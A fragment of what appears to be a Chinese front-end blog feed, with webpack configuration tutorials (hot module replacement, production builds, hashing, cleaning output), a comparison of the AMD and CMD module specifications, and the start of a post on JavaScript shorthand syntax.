class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">const webpack = require(&apos;webpack&apos;);</div><div class="line">const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);</div><div class="line"></div><div class="line">module.exports = &#123;</div><div class="line">    entry: __dirname + &quot;/app/main.js&quot;,//已多次提及的唯一入口文件</div><div class="line">    output: &#123;</div><div class="line">        path: __dirname + &quot;/build&quot;,</div><div class="line">        filename: &quot;bundle.js&quot;</div><div class="line">    &#125;,</div><div class="line">    devtool: &apos;eval-source-map&apos;,</div><div class="line">    devServer: &#123;</div><div class="line">        contentBase: &quot;./public&quot;,//本地服务器所加载的页面所在的目录</div><div class="line">        historyApiFallback: true,//不跳转</div><div class="line">        inline: true//实时刷新</div><div class="line">    &#125;,</div><div class="line">    module: &#123;</div><div class="line">        rules: [</div><div class="line">            &#123;</div><div class="line">                test: /(\.jsx|\.js)$/,</div><div class="line">                use: &#123;</div><div class="line">                    loader: &quot;babel-loader&quot;</div><div class="line">                &#125;,</div><div class="line">                exclude: /node_modules/</div><div class="line">            &#125;,</div><div class="line">            &#123;</div><div class="line">                test: /\.css$/,</div><div class="line">                use: [</div><div class="line">                    &#123;</div><div class="line">                        loader: &quot;style-loader&quot;</div><div class="line">                    &#125;, &#123;</div><div class="line">                        loader: &quot;css-loader&quot;,</div><div class="line">                        options: &#123;</div><div class="line">                            modules: true</div><div class="line">                        &#125;</div><div class="line">                    &#125;, &#123;</div><div class="line">                        loader: &quot;postcss-loader&quot;</div><div class="line">                    &#125;</div><div class="line">                ]</div><div class="line">            &#125;</div><div class="line">        ]</div><div class="line">    &#125;,</div><div class="line">    plugins: [</div><div class="line">        new webpack.BannerPlugin(&apos;版权所有，翻版必究&apos;),</div><div class="line">        new HtmlWebpackPlugin(&#123;</div><div class="line">            template: __dirname + &quot;/app/index.tmpl.html&quot;//new 一个这个插件的实例，并传入相关的参数</div><div class="line">        &#125;)</div><div class="line">    ],</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>再次执行npm start你会发现，build文件夹下面生成了bundle.js和index.html。</p><p><img src="//upload-images.jianshu.io/upload_images/1031000-0e13dc8a49d9cda5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/510" alt="这里写图片描述"></p><h3 id="Hot-Module-Replacement"><a href="#Hot-Module-Replacement" class="headerlink" title="Hot Module Replacement"></a>Hot Module Replacement</h3><p>Hot Module Replacement（HMR）也是webpack里很有用的一个插件，它允许你在修改组件代码后，自动刷新实时预览修改后的效果。</p><p>在webpack中实现HMR也很简单，只需要做两项配置</p><p>1.在webpack配置文件中添加HMR插件；<br>2.在Webpack Dev Server中添加“hot”参数；</p><p>不过配置完这些后，JS模块其实还是不能自动热加载的，还需要在你的JS模块中执行一个Webpack提供的API才能实现热加载，虽然这个API不难使用，但是如果是React模块，使用我们已经熟悉的Babel可以更方便的实现功能热加载。</p><p>整理下我们的思路，具体实现方法如下<br>Babel和webpack是独立的工具<br>二者可以一起工作<br>二者都可以通过插件拓展功能<br>HMR是一个webpack插件，它让你能浏览器中实时观察模块修改后的效果，但是如果你想让它工作，需要对模块进行额外的配额；<br>Babel有一个叫做react-transform-hrm的插件，可以在不对React模块进行额外的配置的前提下让HMR正常工作；</p><p>还是继续上例来实际看看如何配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">const webpack = require(&apos;webpack&apos;);</div><div class="line">const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);</div><div class="line"></div><div class="line">module.exports = &#123;</div><div class="line">    entry: __dirname + &quot;/app/main.js&quot;,//已多次提及的唯一入口文件</div><div class="line">    output: &#123;</div><div class="line">        path: __dirname + &quot;/build&quot;,</div><div class="line">        filename: &quot;bundle.js&quot;</div><div class="line">    &#125;,</div><div class="line">    devtool: &apos;eval-source-map&apos;,</div><div class="line">    devServer: &#123;</div><div class="line">        contentBase: &quot;./public&quot;,//本地服务器所加载的页面所在的目录</div><div class="line">        historyApiFallback: true,//不跳转</div><div class="line">        inline: true,</div><div class="line">        hot: true</div><div class="line">    &#125;,</div><div class="line">    module: &#123;</div><div class="line">        rules: [</div><div class="line">            &#123;</div><div class="line">                test: /(\.jsx|\.js)$/,</div><div class="line">                use: &#123;</div><div class="line">                    loader: &quot;babel-loader&quot;</div><div class="line">                &#125;,</div><div class="line">                exclude: /node_modules/</div><div class="line">            &#125;,</div><div class="line">            &#123;</div><div class="line">                test: /\.css$/,</div><div class="line">                use: [</div><div class="line">                    &#123;</div><div class="line">                        loader: &quot;style-loader&quot;</div><div class="line">                    &#125;, &#123;</div><div class="line">                        loader: &quot;css-loader&quot;,</div><div class="line">                        options: &#123;</div><div class="line">                            modules: true</div><div class="line">                        &#125;</div><div class="line">                    &#125;, &#123;</div><div class="line">                        loader: &quot;postcss-loader&quot;</div><div class="line">                    &#125;</div><div class="line">                ]</div><div class="line">            &#125;</div><div class="line">        ]</div><div class="line">    &#125;,</div><div class="line">    plugins: [</div><div class="line">        new webpack.BannerPlugin(&apos;版权所有，翻版必究&apos;),</div><div class="line">        new HtmlWebpackPlugin(&#123;</div><div class="line">            template: __dirname + &quot;/app/index.tmpl.html&quot;//new 一个这个插件的实例，并传入相关的参数</div><div class="line">        &#125;),</div><div class="line">        new webpack.HotModuleReplacementPlugin()//热加载插件</div><div class="line">    ],</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><p>安装react-transform-hmr<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install --save-dev babel-plugin-react-transform react-transform-hmr</div></pre></td></tr></table></figure></p><p>配置Babel<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">// .babelrc</div><div class="line">&#123;</div><div class="line">  &quot;presets&quot;: [&quot;react&quot;, &quot;env&quot;],</div><div class="line">  &quot;env&quot;: &#123;</div><div class="line">    &quot;development&quot;: &#123;</div><div class="line">    &quot;plugins&quot;: [[&quot;react-transform&quot;, &#123;</div><div class="line">       &quot;transforms&quot;: [&#123;</div><div class="line">         &quot;transform&quot;: &quot;react-transform-hmr&quot;,</div><div class="line">         </div><div class="line">         &quot;imports&quot;: [&quot;react&quot;],</div><div class="line">         </div><div class="line">         &quot;locals&quot;: [&quot;module&quot;]</div><div class="line">       &#125;]</div><div class="line">     &#125;]]</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="产品阶段的构建"><a href="#产品阶段的构建" class="headerlink" title="产品阶段的构建"></a>产品阶段的构建</h3><p>现在当你使用React时，可以热加载模块了,每次保存就能在浏览器上看到更新内容。</p><p>目前为止，我们已经使用webpack构建了一个完整的开发环境。但是在产品阶段，可能还需要对打包的文件进行额外的处理，比如说优化，压缩，缓存以及分离CSS和JS。</p><p>对于复杂的项目来说，需要复杂的配置，这时候分解配置文件为多个小的文件可以使得事情井井有条，以上面的例子来说，我们创建一个webpack.production.config.js的文件，在里面加上基本的配置,它和原始的webpack.config.js很像，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">// webpack.production.config.js</div><div class="line">const webpack = require(&apos;webpack&apos;);</div><div class="line">const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);</div><div class="line"></div><div class="line">module.exports = &#123;</div><div class="line">    entry: __dirname + &quot;/app/main.js&quot;, //已多次提及的唯一入口文件</div><div class="line">    output: &#123;</div><div class="line">        path: __dirname + &quot;/build&quot;,</div><div class="line">        filename: &quot;bundle.js&quot;</div><div class="line">    &#125;,</div><div class="line">    devtool: &apos;null&apos;, //注意修改了这里，这能大大压缩我们的打包代码</div><div class="line">    devServer: &#123;</div><div class="line">        contentBase: &quot;./public&quot;, //本地服务器所加载的页面所在的目录</div><div class="line">        historyApiFallback: true, //不跳转</div><div class="line">        inline: true,</div><div class="line">        hot: true</div><div class="line">    &#125;,</div><div class="line">    module: &#123;</div><div class="line">        rules: [&#123;</div><div class="line">            test: /(\.jsx|\.js)$/,</div><div class="line">            use: &#123;</div><div class="line">                loader: &quot;babel-loader&quot;</div><div class="line">            &#125;,</div><div class="line">            exclude: /node_modules/</div><div class="line">        &#125;, &#123;</div><div class="line">            test: /\.css$/,</div><div class="line">            use: ExtractTextPlugin.extract(&#123;</div><div class="line">                fallback: &quot;style-loader&quot;,</div><div class="line">                use: [&#123;</div><div class="line">                    loader: &quot;css-loader&quot;,</div><div class="line">                    options: &#123;</div><div class="line">                        modules: true</div><div class="line">                    &#125;</div><div class="line">                &#125;, &#123;</div><div class="line">                    loader: &quot;postcss-loader&quot;</div><div class="line">                &#125;],</div><div class="line">            &#125;)</div><div class="line">        &#125;]</div><div class="line">    &#125;,</div><div class="line">    plugins: [</div><div class="line">        new webpack.BannerPlugin(&apos;版权所有，翻版必究&apos;),</div><div class="line">        new HtmlWebpackPlugin(&#123;</div><div class="line">            template: __dirname + &quot;/app/index.tmpl.html&quot; //new 一个这个插件的实例，并传入相关的参数</div><div class="line">        &#125;),</div><div class="line">        new webpack.HotModuleReplacementPlugin() //热加载插件</div><div class="line">    ],</div><div class="line">&#125;;</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">//package.json</div><div class="line">&#123;</div><div class="line">  &quot;name&quot;: &quot;test&quot;,</div><div class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</div><div class="line">  &quot;description&quot;: &quot;&quot;,</div><div class="line">  &quot;main&quot;: &quot;index.js&quot;,</div><div class="line">  &quot;scripts&quot;: &#123;</div><div class="line">    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;,</div><div class="line">    &quot;start&quot;: &quot;webpack&quot;,</div><div class="line">    &quot;server&quot;: &quot;webpack-dev-server --open&quot;,</div><div class="line">    &quot;build&quot;: &quot;NODE_ENV=production webpack --config ./webpack.production.config.js --progress&quot;</div><div class="line">  &#125;,</div><div class="line">  &quot;author&quot;: &quot;&quot;,</div><div class="line">  &quot;license&quot;: &quot;ISC&quot;,</div><div class="line">  &quot;devDependencies&quot;: &#123;</div><div class="line">...</div><div class="line">  &#125;,</div><div class="line">  &quot;dependencies&quot;: &#123;</div><div class="line">    &quot;react&quot;: &quot;^15.6.1&quot;,</div><div class="line">    &quot;react-dom&quot;: &quot;^15.6.1&quot;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><blockquote><p>注意:如果是window电脑，build需要配置为”build”: “set NODE_ENV=production &amp;&amp; webpack –config ./webpack.production.config.js –progress”</p></blockquote><h3 id="优化插件"><a href="#优化插件" class="headerlink" title="优化插件"></a>优化插件</h3><p>webpack提供了一些在发布阶段非常有用的优化插件，它们大多来自于webpack社区，可以通过npm安装，通过以下插件可以完成产品发布阶段所需的功能</p><p>OccurenceOrderPlugin :为组件分配ID，通过这个插件webpack可以分析和优先考虑使用最多的模块，并为它们分配最小的ID<br>UglifyJsPlugin：压缩JS代码；<br>ExtractTextPlugin：分离CSS和JS文件</p><p>我们继续用例子来看看如何添加它们，OccurenceOrder 和 UglifyJS plugins 都是内置插件，你需要做的只是安装其它非内置插件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install --save-dev extract-text-webpack-plugin</div></pre></td></tr></table></figure></p><p>在配置文件的plugins后引用它们<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">// webpack.production.config.js</div><div class="line">const webpack = require(&apos;webpack&apos;);</div><div class="line">const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);</div><div class="line">const ExtractTextPlugin = require(&apos;extract-text-webpack-plugin&apos;);</div><div class="line"></div><div class="line">module.exports = &#123;</div><div class="line">    entry: __dirname + &quot;/app/main.js&quot;,//已多次提及的唯一入口文件</div><div class="line">    output: &#123;</div><div class="line">        path: __dirname + &quot;/build&quot;,</div><div class="line">        filename: &quot;bundle.js&quot;</div><div class="line">    &#125;,</div><div class="line">    devtool: &apos;none&apos;,</div><div class="line">    devServer: &#123;</div><div class="line">        contentBase: &quot;./public&quot;,//本地服务器所加载的页面所在的目录</div><div class="line">        historyApiFallback: true,//不跳转</div><div class="line">        inline: true,</div><div class="line">        hot: true</div><div class="line">    &#125;,</div><div class="line">    module: &#123;</div><div class="line">        rules: [</div><div class="line">            &#123;</div><div class="line">                test: /(\.jsx|\.js)$/,</div><div class="line">                use: &#123;</div><div class="line">                    loader: &quot;babel-loader&quot;</div><div class="line">                &#125;,</div><div class="line">                exclude: /node_modules/</div><div class="line">            &#125;,</div><div class="line">            &#123;</div><div class="line">                test: /\.css$/,</div><div class="line">                use: [</div><div class="line">                    &#123;</div><div class="line">                        loader: &quot;style-loader&quot;</div><div class="line">                    &#125;, &#123;</div><div class="line">                        loader: &quot;css-loader&quot;,</div><div class="line">                        options: &#123;</div><div class="line">                            modules: true</div><div class="line">                        &#125;</div><div class="line">                    &#125;, &#123;</div><div class="line">                        loader: &quot;postcss-loader&quot;</div><div class="line">                    &#125;</div><div class="line">                ]</div><div class="line">            &#125;</div><div class="line">        ]</div><div class="line">    &#125;,</div><div class="line">    plugins: [</div><div class="line">        new webpack.BannerPlugin(&apos;版权所有，翻版必究&apos;),</div><div class="line">        new HtmlWebpackPlugin(&#123;</div><div class="line">            template: __dirname + &quot;/app/index.tmpl.html&quot;</div><div class="line">        &#125;),</div><div class="line">        new webpack.optimize.OccurrenceOrderPlugin(),</div><div class="line">        new webpack.optimize.UglifyJsPlugin(),</div><div class="line">        new ExtractTextPlugin(&quot;style.css&quot;)</div><div class="line">    ],</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><p>此时执行npm run build可以看见代码是被压缩后的代码</p><h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><p>缓存无处不在，使用缓存的最好方法是保证你的文件名和文件内容是匹配的（内容改变，名称相应改变）</p><p>webpack可以把一个哈希值添加到打包的文件名中，使用方法如下,添加特殊的字符串混合体（[name], [id] and [hash]）到输出文件名前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">const webpack = require(&apos;webpack&apos;);</div><div class="line">const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);</div><div class="line">const ExtractTextPlugin = require(&apos;extract-text-webpack-plugin&apos;);</div><div class="line"></div><div class="line">module.exports = &#123;</div><div class="line">..</div><div class="line">    output: &#123;</div><div class="line">        path: __dirname + &quot;/build&quot;,</div><div class="line">        filename: &quot;bundle-[hash].js&quot;</div><div class="line">    &#125;,</div><div class="line">   ...</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><p>现在用户会有合理的缓存了。<br><img src="//upload-images.jianshu.io/upload_images/1031000-2441bb1e9f8f5908.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="这里写图片描述"></p><h3 id="去除build文件中的残余文件"><a href="#去除build文件中的残余文件" class="headerlink" title="去除build文件中的残余文件"></a>去除build文件中的残余文件</h3><p>添加了hash之后，会导致改变文件内容后重新打包时，文件名不同而内容越来越多，因此这里介绍另外一个很好用的插件clean-webpack-plugin。</p><p><strong>安装：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cnpm install clean-webpack-plugin --save-dev</div></pre></td></tr></table></figure></p><p><strong>使用：</strong><br>引入clean-webpack-plugin插件后在配置文件的plugins中做相应配置即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">const CleanWebpackPlugin = require(&quot;clean-webpack-plugin&quot;);</div><div class="line">  plugins: [</div><div class="line">    ...// 这里是之前配置的其它各种插件</div><div class="line">    new CleanWebpackPlugin(&apos;build/*.*&apos;, &#123;</div><div class="line">      root: __dirname,</div><div class="line">      verbose: true,</div><div class="line">      dry: false</div><div class="line">  &#125;)</div><div class="line">  ]</div></pre></td></tr></table></figure></p><p>关于clean-webpack-plugin的详细使用可参考<a href="https://link.jianshu.com?t=https://github.com/johnagan/clean-webpack-plugin" target="_blank" rel="external">这里</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;什么是webpack&quot;&gt;&lt;a href=&quot;#什么是webpack&quot; class=&quot;headerlink&quot; title=&quot;什么是webpack&quot;&gt;&lt;/a&gt;什么是webpack&lt;/h3&gt;&lt;p&gt;webpack是一个module bundler（模块打包工具），所谓的模块
      
    
    </summary>
    
      <category term="前端" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="Webpack" scheme="http://yoursite.com/tags/Webpack/"/>
    
  </entry>
  
  <entry>
    <title>AMD与CMD</title>
    <link href="http://yoursite.com/2017/02/10/AMD%E4%B8%8ECMD/"/>
    <id>http://yoursite.com/2017/02/10/AMD与CMD/</id>
    <published>2017-02-10T10:45:31.000Z</published>
    <updated>2017-11-07T14:17:08.406Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://link.zhihu.com/?target=https%3A//github.com/amdjs/amdjs-api/wiki/AMD" target="_blank" rel="external">AMD 规范</a><br><a href="https://link.zhihu.com/?target=https%3A//github.com/seajs/seajs/issues/242" target="_blank" rel="external">CMD 规范</a></p><p>AMD 是 RequireJS 在推广过程中对模块定义的规范化产出。<br>CMD 是 SeaJS 在推广过程中对模块定义的规范化产出。<br>类似的还有 CommonJS Modules/2.0 规范，是 BravoJS 在推广过程中对模块定义的规范化产出。<br>还有不少</p><p>这些规范的目的都是为了 JavaScript 的模块化开发，特别是在浏览器端的。<br>目前这些规范的实现都能达成浏览器端模块化开发的目的。</p><h3 id="相同之处"><a href="#相同之处" class="headerlink" title="相同之处"></a>相同之处</h3><p>RequireJS 和 Sea.js 都是模块加载器，倡导模块化开发理念，核心价值是让 JavaScript 的模块化开发变得简单自然。</p><h3 id="不同之处"><a href="#不同之处" class="headerlink" title="不同之处"></a>不同之处</h3><p>两者的主要区别如下：</p><ul><li>定位有差异。RequireJS 想成为浏览器端的模块加载器，同时也想成为 Rhino / Node 等环境的模块加载器。Sea.js 则专注于 Web 浏览器端，同时通过 Node 扩展的方式可以很方便跑在 Node 环境中。</li><li>遵循的规范不同。RequireJS 遵循 AMD（异步模块定义）规范，Sea.js 遵循 CMD （通用模块定义）规范。规范的不同，导致了两者 API 不同。Sea.js 更贴近 CommonJS Modules/1.1 和 Node Modules 规范。</li><li>推广理念有差异。RequireJS 在尝试让第三方类库修改自身来支持 RequireJS，目前只有少数社区采纳。Sea.js 不强推，采用自主封装的方式来“海纳百川”，目前已有较成熟的封装策略。</li><li>对开发调试的支持有差异。Sea.js 非常关注代码的开发调试，有 nocache、debug 等用于调试的插件。RequireJS 无这方面的明显支持。</li><li>插件机制不同。RequireJS 采取的是在源码中预留接口的形式，插件类型比较单一。Sea.js 采取的是通用事件机制，插件类型更丰富。</li><li>执行模块的机制大不一样，SeaJS对模块的态度是懒执行, 而RequireJS对模块的态度是预执行<br>还有不少差异，涉及具体使用方式和源码实现，欢迎有兴趣者研究并发表看法。</li></ul><p>总之，如果说 RequireJS 是 Prototype 类库的话，则 Sea.js 致力于成为 jQuery 类库。</p><ul><li>CMD推崇依赖就近，可以把依赖写进你的代码中的任意一行<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require, exports, module</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'./a'</span>)</div><div class="line">  a.doSomething()</div><div class="line">  <span class="keyword">var</span> b = <span class="built_in">require</span>(<span class="string">'./b'</span>)</div><div class="line">  b.doSomething()</div><div class="line">&#125;)</div></pre></td></tr></table></figure></li></ul><p>代码在运行时，首先是不知道依赖的，需要遍历所有的require关键字，找出后面的依赖。具体做法是将function toString后，用正则匹配出require关键字后面的依赖。显然，这是一种牺牲性能来换取更多开发便利的方法。</p><ul><li>而AMD是依赖前置的，换句话说，在解析和执行当前模块之前，模块作者必须指明当前模块所依赖的模块<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">define([<span class="string">'./a'</span>,<span class="string">'./b'</span>],<span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</div><div class="line">   a.doSomething()</div><div class="line">   b.doSomething()</div><div class="line">&#125;)</div></pre></td></tr></table></figure></li></ul><p>代码在一旦运行到此处，能立即知晓依赖。而无需遍历整个函数体找到它的依赖，因此性能有所提升，缺点就是开发者必须显式得指明依赖——这会使得开发工作量变大，比如：当你写到函数体内部几百上千行的时候，忽然发现需要增加一个依赖，你不得不回到函数顶端来将这个依赖添加进数组。</p><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>至此可以对由commonJS衍生出来的方案做出总结了。在浏览器端来设计模块加载机制，需要考虑依赖的问题。<br>我们先把依赖分为两种，“强依赖” —— 肯定需要 和“弱依赖” —— 可能需要。<br>对于强依赖，如果要性能优先，则考虑参照依赖前置的思想设计你的模块加载器，我个人也更推崇这个方案一些；如果考虑开发成本优先，则考虑按照依赖就近的思想设计你的模块加载器。<br>对于弱依赖，只需要将弱依赖的部分改写到回调函数内即可。<br>如果现在我要实现一个模块加载器，我会将强依赖前置，弱依赖采用异步回调函数的形式，其它的方法我认为都只是语法糖而已，仅此就够了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/amdjs/amdjs-api/wiki/AMD&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;AMD 规范&lt;/a&gt;&lt;br&gt;&lt;a hr
      
    
    </summary>
    
      <category term="前端" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="插件" scheme="http://yoursite.com/tags/%E6%8F%92%E4%BB%B6/"/>
    
      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript编码简写技巧 19+</title>
    <link href="http://yoursite.com/2017/01/22/JavaScript%E7%BC%96%E7%A0%81%E7%AE%80%E5%86%99%E6%8A%80%E5%B7%A7%2019+%20/"/>
    <id>http://yoursite.com/2017/01/22/JavaScript编码简写技巧 19+ /</id>
    <published>2017-01-22T15:16:06.000Z</published>
    <updated>2018-01-16T17:05:39.401Z</updated>
    
    <content type="html"><![CDATA[<h3 id="三元操作符"><a href="#三元操作符" class="headerlink" title="三元操作符"></a>三元操作符</h3><p>当你想在一行代码中写一个 if..else 语句时，这是一个很好的节省代码的方式。</p><p>普通写法：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> x = <span class="number">20</span>;</div><div class="line"><span class="keyword">let</span> answer;</div><div class="line"><span class="keyword">if</span> (x &gt; <span class="number">10</span>) &#123;</div><div class="line">    answer = <span class="string">'is greater'</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    answer = <span class="string">'is lesser'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>简写：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> answer = x &gt; <span class="number">10</span> ? <span class="string">'greater than 10'</span> : <span class="string">'less than 10'</span>;</div></pre></td></tr></table></figure></p><p>你也可以像这样嵌套 if 语句：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> answer = x &gt; <span class="number">10</span> ? <span class="string">" greater than 10"</span> : x</div></pre></td></tr></table></figure></p><h3 id="缩短求值简写"><a href="#缩短求值简写" class="headerlink" title="缩短求值简写"></a>缩短求值简写</h3><p>将变量值分配给另一个变量时，你可能需要确保源变量不为 null、undefined 或者不为空。你可以使用多个条件写一个很长的 if 语句，也可以使用缩短求值的简写办法。</p><p>普通写法：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (variable1 !== <span class="literal">null</span> || variable1 !== <span class="literal">undefined</span> || variable1 !== <span class="string">''</span>) &#123;</div><div class="line">     <span class="keyword">let</span> variable2 = variable1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>简写：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> variable2 = variable1  || <span class="string">'new'</span>;</div></pre></td></tr></table></figure></p><h3 id="变量声明速简写"><a href="#变量声明速简写" class="headerlink" title="变量声明速简写"></a>变量声明速简写</h3><p>在函数开始处声明变量并赋值是一个很好的习惯。这种简写方法可以同时声明多个变量，为您节省大量的时间和空间。</p><p>普通写法：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> x;</div><div class="line"><span class="keyword">let</span> y;</div><div class="line"><span class="keyword">let</span> z = <span class="number">3</span>;</div></pre></td></tr></table></figure></p><p>简写：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> x, y, z=<span class="number">3</span>;</div></pre></td></tr></table></figure></p><h3 